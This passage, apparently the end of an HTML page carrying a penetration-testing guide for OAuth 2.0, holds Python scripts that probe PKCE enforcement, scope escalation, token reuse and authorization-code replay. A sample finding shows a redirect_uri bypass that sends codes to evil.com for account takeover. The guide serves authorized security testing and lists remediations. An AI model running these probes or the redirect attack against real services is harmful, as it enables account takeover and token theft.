  \"response_type\": \"code\",\n    \"client_id\": CLIENT_ID,\n    \"redirect_uri\": REDIRECT_URI,\n    \"scope\": SCOPE,\n    \"state\": secrets.token_urlsafe(32),\n}\nresp = requests.get(auth_endpoint, params=params_no_pkce, allow_redirects=False)\nif resp.status_code == 302 and \"code=\" in resp.headers.get(\"Location\", \"\"):\n    print(\"[PKCE] Authorization code issued without PKCE challenge\")\n\n# Test 2: Token exchange without code_verifier\nauth_code = \"captured_auth_code\"  # From intercept\ntoken_resp = requests.post(token_endpoint, data={\n    \"grant_type\": \"authorization_code\",\n    \"code\": auth_code,\n    \"redirect_uri\": REDIRECT_URI,\n    \"client_id\": CLIENT_ID,\n    # No code_verifier\n})\nif token_resp.status_code == 200:\n    print(\"[PKCE] Token issued without code_verifier - PKCE not enforced\")\n\n# Test 3: Token exchange with wrong code_verifier\ntoken_resp = requests.post(token_endpoint, data={\n    \"grant_type\": \"authorization_code\",\n    \"code\": auth_code,\n    \"redirect_uri\": REDIRECT_URI,\n    \"client_id\": CLIENT_ID,\n    \"code_verifier\": \"wrong_verifier_value_that_does_not_match\",\n})\nif token_resp.status_code == 200:\n    print(\"[PKCE] Token issued with wrong code_verifier - PKCE validation broken\")\n\n# Test 4: Downgrade from S256 to plain\nparams_plain_pkce = {\n    **params_no_pkce,\n    \"code_challenge\": code_verifier,  # Plain = verifier itself\n    \"code_challenge_method\": \"plain\",\n}\nresp = requests.get(auth_endpoint, params=params_plain_pkce, allow_redirects=False)\nif resp.status_code == 302:\n    print(\"[PKCE] Plain challenge method accepted - vulnerable to interception\")\n```\n\n### Step 5: Scope Escalation and Token Testing\n\n```python\n# Test 1: Request additional scopes beyond what's registered\nelevated_scopes = [\n    \"openid profile email admin\",\n    \"openid profile email write:users\",\n    \"openid profile email delete:*\",\n    \"openid profile email admin:full\",\n    \"*\",\n]\n\nfor scope in elevated_scopes:\n    params = {\n        \"response_type\": \"code\",\n        \"client_id\": CLIENT_ID,\n        \"redirect_uri\": REDIRECT_URI,\n        \"scope\": scope,\n        \"state\": secrets.token_urlsafe(32),\n    }\n    resp = requests.get(auth_endpoint, params=params, allow_redirects=False)\n    if resp.status_code == 302:\n        location = resp.headers.get(\"Location\", \"\")\n        if \"code=\" in location:\n            print(f\"[SCOPE] Elevated scope accepted: {scope}\")\n\n# Test 2: Token reuse across clients\n# Use a token from client A on client B's API\ntoken_a = \"access_token_from_client_a\"\nresp = requests.get(\"https://other-service.example.com/api/resource\",\n    headers={\"Authorization\": f\"Bearer {token_a}\"})\nif resp.status_code == 200:\n    print(\"[TOKEN] Token from client A accepted by different service (audience not validated)\")\n\n# Test 3: Refresh token theft and reuse\nrefresh_token = \"captured_refresh_token\"\n# Try using refresh token with different client_id\ntoken_resp = requests.post(token_endpoint, data={\n    \"grant_type\": \"refresh_token\",\n    \"refresh_token\": refresh_token,\n    \"client_id\": \"different-client-id\",\n})\nif token_resp.status_code == 200:\n    print(\"[TOKEN] Refresh token accepted for different client - not bound to client\")\n```\n\n### Step 6: Implicit Flow and Token Leakage Testing\n\n```python\n# Test if implicit flow is enabled (should be disabled per OAuth 2.1)\nimplicit_params = {\n    \"response_type\": \"token\",\n    \"client_id\": CLIENT_ID,\n    \"redirect_uri\": REDIRECT_URI,\n    \"scope\": SCOPE,\n    \"state\": secrets.token_urlsafe(32),\n}\nresp = requests.get(auth_endpoint, params=implicit_params, allow_redirects=False)\nif resp.status_code == 302:\n    location = resp.headers.get(\"Location\", \"\")\n    if \"access_token=\" in location:\n        print(\"[IMPLICIT] Implicit flow enabled - token in URL fragment (deprecated/insecure)\")\n\n# Test token leakage via Referer header\n# Check if tokens appear in URLs that could leak via Referer\nprint(\"\\nToken Leakage Checks:\")\nprint(\"  - Check if access tokens appear in URL query parameters\")\nprint(\"  - Check if tokens are logged in server access logs\")\nprint(\"  - Check if callback URL with code is cached by the browser\")\nprint(\"  - Check if the authorization code is single-use (replay test)\")\n\n# Authorization code replay test\nauth_code_to_replay = \"captured_auth_code\"\nfor attempt in range(3):\n    token_resp = requests.post(token_endpoint, data={\n        \"grant_type\": \"authorization_code\",\n        \"code\": auth_code_to_replay,\n        \"redirect_uri\": REDIRECT_URI,\n        \"client_id\": CLIENT_ID,\n        \"client_secret\": \"client_secret_value\",\n    })\n    print(f\"  Code replay attempt {attempt+1}: {token_resp.status_code}\")\n    if attempt > 0 and token_resp.status_code == 200:\n        print(\"  [VULNERABLE] Authorization code is not single-use\")\n```\n\n## Key Concepts\n\n| Term | Definition |\n|------|------------|\n| **Authorization Code Flow** | OAuth 2.0 flow where the client receives an authorization code via redirect, then exchanges it for tokens at the token endpoint |\n| **PKCE** | Proof Key for Code Exchange - extension that binds the authorization request to the token request using a code verifier/challenge, preventing authorization code interception |\n| **Redirect URI Validation** | Authorization server verification that the redirect_uri matches the registered value exactly, preventing code/token theft via open redirect |\n| **State Parameter** | Random value passed in the authorization request and verified in the callback to prevent CSRF attacks on the OAuth flow |\n| **Scope Escalation** | Requesting or obtaining more permissions (scopes) than the client is authorized for, enabling unauthorized access |\n| **Implicit Flow** | Deprecated OAuth flow that returns tokens directly in the URL fragment, vulnerable to token leakage and replay attacks |\n\n## Tools & Systems\n\n- **Burp Suite Professional**: Intercept and manipulate OAuth redirects, authorization codes, and token exchanges\n- **EsPReSSO (Burp Extension)**: Automated testing of OAuth and OpenID Connect implementations for known vulnerabilities\n- **oauth2-security-tester**: Dedicated tool for testing OAuth 2.0 flows against common attack patterns\n- **OWASP ZAP**: Passive scanner that detects OAuth misconfigurations in intercepted traffic\n- **jwt.io**: Online JWT decoder for analyzing OAuth access tokens and ID tokens\n\n## Common Scenarios\n\n### Scenario: Social Login OAuth Implementation Assessment\n\n**Context**: A web application implements \"Login with Google\" and \"Login with GitHub\" using OAuth 2.0 Authorization Code flow. The application is a SaaS platform where account takeover has high business impact.\n\n**Approach**:\n1. Analyze the OAuth configuration at `/.well-known/openid-configuration` for both providers\n2. Test redirect URI validation: discover that the application registers `https://app.example.com/callback` but the server accepts `https://app.example.com/callback/..%2fevil`\n3. Test state parameter: authorization request includes state but the callback handler does not validate it (CSRF possible)\n4. Test PKCE: not implemented for the authorization code flow, making code interception possible on mobile\n5. Test implicit flow: still enabled despite not being used by the application\n6. Test scope: application requests `openid profile email` but the authorization server also grants `read:repos` without explicit consent\n7. Test authorization code replay: code can be exchanged twice, indicating lack of single-use enforcement\n8. Test token audience: access token from Google login accepted by GitHub API endpoint (audience not validated)\n\n**Pitfalls**:\n- Only testing the OAuth flow in the browser without intercepting and manipulating redirect parameters\n- Not testing both the authorization request and the token exchange independently\n- Missing open redirect vulnerabilities in the application that can be chained with OAuth redirect_uri\n- Not testing the state parameter validation on the client side (server may include it but client may not check it)\n- Assuming PKCE is enforced because the authorization server supports it (client must also send it)\n\n## Output Format\n\n```\n## Finding: OAuth2 Redirect URI Bypass Enables Authorization Code Theft\n\n**ID**: API-OAUTH-001\n**Severity**: Critical (CVSS 9.3)\n**Affected Component**: OAuth 2.0 Authorization Code Flow\n**Authorization Server**: auth.example.com\n\n**Description**:\nThe authorization server's redirect_uri validation uses prefix matching\ninstead of exact string matching. An attacker can manipulate the redirect_uri\nto redirect the authorization code to an attacker-controlled endpoint,\nenabling account takeover. Additionally, PKCE is not enforced and the\nstate parameter is not validated by the client application.\n\n**Proof of Concept**:\n1. Craft authorization URL with manipulated redirect_uri:\n   https://auth.example.com/authorize?response_type=code&client_id=app\n   &redirect_uri=https://app.example.com/callback/../../../evil.com\n   &scope=openid+profile+email&state=abc123\n2. User authenticates and approves consent\n3. Authorization code redirected to https://evil.com?code=AUTH_CODE&state=abc123\n4. Attacker exchanges code at token endpoint (no PKCE required)\n5. Attacker receives access token and ID token for victim's account\n\n**Impact**:\nComplete account takeover for any user who clicks a crafted OAuth login link.\nThe attacker gains full access to the user's profile, email, and any\nresources the OAuth scope grants access to.\n\n**Remediation**:\n1. Implement exact string matching for redirect_uri validation (no wildcards, no prefix matching)\n2. Enforce PKCE (S256 method) for all authorization code flow requests\n3. Validate the state parameter in the callback handler before exchanging the code\n4. Disable the implicit flow on the authorization server\n5. Enforce single-use authorization codes with a short TTL (max 60 seconds)\n6. Validate the audience (aud) claim in tokens before accepting them\n```\n\n"</script>
+  <script>
+    const root = document.documentElement;
+    const saved = localStorage.getItem("skills-reader-theme") || "dark";
+    const skillPackage = JSON.parse(document.getElementById("skillPackage").textContent || '""');
+    function setTheme(theme) {
+      root.dataset.theme = theme;
+      localStorage.setItem("skills-reader-theme", theme);
+    }
+    function downloadText(filename, value) {
+      const blob = new Blob([value], { type: "text/markdown;charset=utf-8" });
+      const url = URL.createObjectURL(blob);
+      const link = document.createElement("a");
+      link.href = url;
+      link.download = filename;
+      document.body.appendChild(link);
+      link.click();
+      link.remove();
+      URL.revokeObjectURL(url);
+    }
+    document.getElementById("themeButton").addEventListener("click", () => setTheme(root.dataset.theme === "light" ? "dark" : "light"));
+    document.getElementById("copyButton").addEventListener("click", async () => {
+      await navigator.clipboard.writeText(skillPackage);
+      document.getElementById("copyButton").textContent = "Copied";
+      setTimeout(() => document.getElementById("copyButton").textContent = "Copy skill", 1100);
+    });
+    document.getElementById("downloadButton").addEventListener("click", () => downloadText("testing-oauth2-implementation-flaws-codex-skill.md", skillPackage));
+    setTheme(saved);
+  </script>
+</body>
+</html>
